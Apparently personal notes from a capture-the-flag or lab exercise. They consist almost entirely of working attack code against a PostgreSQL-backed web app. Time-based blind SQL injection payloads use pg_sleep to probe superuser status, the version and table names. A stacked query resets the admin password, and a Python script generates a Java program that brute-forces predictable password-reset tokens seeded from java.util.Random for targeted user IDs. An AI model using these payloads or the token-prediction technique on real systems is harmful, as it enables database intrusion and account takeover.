
Checking for vulnerability:

```sql
SELECT c.id, c.name, count(q.id) as questionCount FROM categories c  LEFT JOIN questions q ON c.id = q.category_id GROUP BY c.id, c.name ORDER BY case when (SELECT current_setting($$is_superuser$$))=$$on$$ then (select 1 from pg_sleep(5)) end;
```

Extracting user:

```sql
SELECT c.id, c.name, count(q.id) as questionCount FROM categories c  LEFT JOIN questions q ON c.id = q.category_id GROUP BY c.id, c.name ORDER BY case when (substr(version(),1,10) = $$PostgreSQL$$) then (select 1 from pg_sleep(5)) end;
```

Extracting database:
```sql
SELECT c.id, c.name, count(q.id) as questionCount FROM categories c  LEFT JOIN questions q ON c.id = q.category_id GROUP BY c.id, c.name ORDER BY case when (substring((select version()),1,1) = $$ASCII(80)$$) then (select 1 from pg_sleep(5)) end;
```

List tables:
```sql
SELECT c.id, c.name, count(q.id) as questionCount FROM categories c  LEFT JOIN questions q ON c.id = q.category_id GROUP BY c.id, c.name ORDER BY case when (substr((SELECT tablename FROM pg_tables where schemaname=$$public$$ LIMIT 1),1,1) = $$t$$) then (select 1 from pg_sleep(5)) end;
```

update admin:
```sql
UPDATE questions SET active="active", needs_mod=true WHERE id = 3; UPDATE users SET password=$$abc$$ WHERE id = 1;
```

```python
def write_tokens(start, end):
	token_generator=""" import java.util.Random; import java.util.Base64; public class Tokens{ public static final String CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz"; public static final String NUMBERS = "1234567890"; public static final String SYMBOLS = "!@#$%^&*()"; public static final String CHARSET = "abcdefghijklmnopqrstuvwxyz" + "abcdefghijklmnopqrstuvwxyz".toUpperCase() + "1234567890" + "!@#$%^&*()"; public static final int TOKEN_LENGTH = 42; public static void main(String args[]){ int length = 42; long start = """+str(start)+"""L; //need to change this value long end ="""+str(end)+"""L ; // need to change this value String token = ""; for (long i=start; i<end;i++){ token = createToken(7,i); //here 7 is the id of user being targetted ; so 7 for Evelyn and 5 for Carl System.out.println(token); } } public static String createToken(int userId,long seed) { Random random = new Random(seed); StringBuilder sb = new StringBuilder(); byte[] encbytes = new byte[42]; for (int i = 0; i < 42; i++) { sb.append(CHARSET.charAt(random.nextInt(CHARSET.length()))); } byte[] bytes = sb.toString().getBytes(); for (int j = 0; j < bytes.length; j++) { encbytes[j] = (byte)(bytes[j] ^ (byte)userId); } return Base64.getUrlEncoder().withoutPadding().encodeToString(encbytes); } } """ 

f=open("Tokens.java","w") f.write(token_generator) print("compiling tokens.java") f.close() os.system("javac Tokens.java") os.system("java Tokens > Tokens.txt")
```